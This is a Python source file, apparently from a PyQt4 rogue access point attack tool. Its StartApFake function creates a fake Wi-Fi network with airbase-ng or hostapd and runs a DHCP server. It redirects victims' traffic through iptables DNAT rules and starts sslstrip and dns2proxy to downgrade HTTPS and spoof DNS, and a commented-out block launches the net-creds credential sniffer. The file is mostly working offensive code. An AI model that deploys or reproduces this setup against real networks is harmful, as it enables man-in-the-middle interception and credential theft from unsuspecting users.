from PyQt4.QtGui import *
from Core.ThRunDhcp import ThRunDhcp
from Core.Threadsslstrip import Threadsslstrip
from Core.Utils import set_monitor_mode, Refactor, ProcessHostapd, ProcessThread
from time import asctime
from subprocess import call, check_output, CalledProcessError
from os import popen
from re import search
from Core.CoreSettings import CoreSettings


def StartApFake(view):
    if len(view.selectCard.currentText()) == 0:
        return QMessageBox.warning(view, 'Error interface', 'Network interface not supported :(')
    if len(view.EditGateway.text()) == 0:
        return QMessageBox.warning(view, 'Error Gateway', 'gateway not found')
    if not view.ConfigTwin['ProgCheck'][5]:
        return QMessageBox.information(view, 'Error Hostapd', 'hostapd not installed')
    dhcp_select = view.FSettings.xmlSettings('dhcp', 'dhcp_server', None, False)
    if dhcp_select == 'iscdhcpserver':
        if not view.ConfigTwin['ProgCheck'][3]:
            return QMessageBox.warning(view, 'Error dhcp', 'isc-dhcp-server not installed')
    elif dhcp_select == 'dnsmasq':
        if not view.ConfigTwin['ProgCheck'][4]:
            return QMessageBox.information(view, 'Error dhcp', 'dnsmasq not installed')
    if str(Refactor.get_interfaces()['activated']).startswith('wlan'):
        return QMessageBox.information(view, 'Error network card',
                                       'You are connected with interface wireless, try again with local connection')
    view.btn_start_attack.setDisabled(True)
    view.APactived = view.FSettings.xmlSettings('accesspoint', 'actived', None, False)
    if view.APactived == 'airbase-ng':
        view.ConfigTwin['interface'] = str(set_monitor_mode(view.selectCard.currentText()).setEnable())
        view.FSettings.xmlSettings('interface', 'monitor_mode', view.ConfigTwin['interface'], False)
        # airbase thread
        Thread_airbase = ProcessThread(['airbase-ng',
                                        '-c', str(view.EditChannel.text()), '-e', view.EditApName.text(),
                                        '-F', 'Logs/Caplog/' + asctime(), view.ConfigTwin['interface']])
        Thread_airbase.name = 'Airbase-ng'
        view.Apthreads['RougeAP'].append(Thread_airbase)
        Thread_airbase.start()
        # settings
        while True:
            if Thread_airbase.iface != None:
                view.ConfigTwin['AP_iface'] = [x for x in Refactor.get_interfaces()['all'] if search('at', x)][0]
                view.FSettings.xmlSettings('netcreds', 'interface', view.ConfigTwin['AP_iface'], False)
                break
        view.CoreSettings()
    elif view.APactived == 'hostapd':
        view.FSettings.xmlSettings('netcreds', 'interface',
                                   str(view.selectCard.currentText()), False)
        view.ConfigTwin['AP_iface'] = str(view.selectCard.currentText())
        try:
            check_output(['nmcli', 'radio', 'wifi', "off"])
        except CalledProcessError:
            try:
                check_output(['nmcli', 'nm', 'wifi', "off"])
            except CalledProcessError as e:
                return QMessageBox.warning(view, 'Error nmcli', e)
        call(['rfkill', 'unblock', 'wlan'])
        CoreSettings(view)
        ignore = ('interface=', 'ssid=', 'channel=')
        with open('Settings/hostapd.conf', 'w') as apconf:
            for i in view.SettingsAP['hostapd']: apconf.write(i)
            for config in str(view.FSettings.ListHostapd.toPlainText()).split('\n'):
                if not config.startswith('#') and len(config) > 0:
                    if not config.startswith(ignore):
                        apconf.write(config + '\n')
            apconf.close()
        view.Thread_hostapd = ProcessHostapd(['hostapd', '-d', 'Settings/hostapd.conf'])
        view.Thread_hostapd.setObjectName('hostapd')
        view.Thread_hostapd.statusAP_connected.connect(view.GetHostapdStatus)
        view.Apthreads['RougeAP'].append(view.Thread_hostapd)
        view.Thread_hostapd.start()

    # thread dhcp
    selected_dhcp = view.FSettings.xmlSettings('dhcp', 'dhcp_server', None, False)
    if selected_dhcp == 'iscdhcpserver':
        Thread_dhcp = ThRunDhcp(
            ['sudo', 'dhcpd', '-d', '-f', '-lf', 'Settings/dhcp/dhcpd.leases', '-cf', '/etc/dhcp/dhcpd.conf',
             view.ConfigTwin['AP_iface']])
        Thread_dhcp.sendRequest.connect(view.GetDHCPRequests)
        Thread_dhcp.setObjectName('DHCP')
        view.Apthreads['RougeAP'].append(Thread_dhcp)
        Thread_dhcp.start()

    ##### dnsmasq disabled
    # elif selected_dhcp == 'dnsmasq':
    #     Thread_dhcp = ThRunDhcp(['dnsmasq','-C','Core/config/dnsmasq.conf','-d'])
    #     self.connect(Thread_dhcp ,SIGNAL('Activated ( QString ) '), self.dhcpLog)
    #     Thread_dhcp .setObjectName('DHCP')
    #     self.Apthreads['RougeAP'].append(Thread_dhcp)
    #     Thread_dhcp .start()
    else:
        return QMessageBox.information(view, 'DHCP', selected_dhcp + ' not found.')
    view.Started(True)
    view.FSettings.xmlSettings('statusAP', 'value', 'True', False)

    if view.FSettings.check_redirect.isChecked() or not view.PopUpPlugins.check_sslstrip.isChecked():
        popen('iptables -t nat -A PREROUTING -p udp -j DNAT --to {}'.format(str(view.EditGateway.text())))
        view.FSettings.xmlSettings('sslstrip_plugin', 'status', 'False', False)
        view.PopUpPlugins.check_sslstrip.setChecked(False)
        view.PopUpPlugins.unset_Rules('sslstrip')

    # thread plugins
    if view.PopUpPlugins.check_sslstrip.isChecked():
        Thread_sslstrip = Threadsslstrip(view.ConfigTwin['PortRedirect'])
        Thread_sslstrip.setObjectName("sslstrip")
        view.Apthreads['RougeAP'].append(Thread_sslstrip)
        Thread_sslstrip.start()

    #TODO: Net-Creds bug au lancement : Socket: Network is Down
    #if view.PopUpPlugins.check_netcreds.isChecked():
    #    Thread_netcreds = ProcessThread(['python', 'Plugins/net-creds/net-creds.py', '-i',
    #                                     view.FSettings.xmlSettings('netcreds', 'interface', None, False)])
    #    Thread_netcreds.setName('Net-Creds')
    #    view.Apthreads['RougeAP'].append(Thread_netcreds)
    #    Thread_netcreds.start()

    if view.PopUpPlugins.check_dns2proy.isChecked():
        Thread_dns2proxy = ProcessThread(['python', 'Plugins/dns2proxy/dns2proxy.py'])
        Thread_dns2proxy.setName('Dns2Proxy')
        view.Apthreads['RougeAP'].append(Thread_dns2proxy)
        Thread_dns2proxy.start()

    iptables = []
    for index in xrange(view.FSettings.ListRules.count()):
        iptables.append(str(view.FSettings.ListRules.item(index).text()))
    for rules in iptables:
        if search('--append FORWARD --in-interface',
                  rules):
            popen(rules.replace('$$', view.ConfigTwin['AP_iface']))
        elif search('--append POSTROUTING --out-interface', rules):
            popen(rules.replace('$$', str(Refactor.get_interfaces()['activated'])))
        else:
            popen(rules)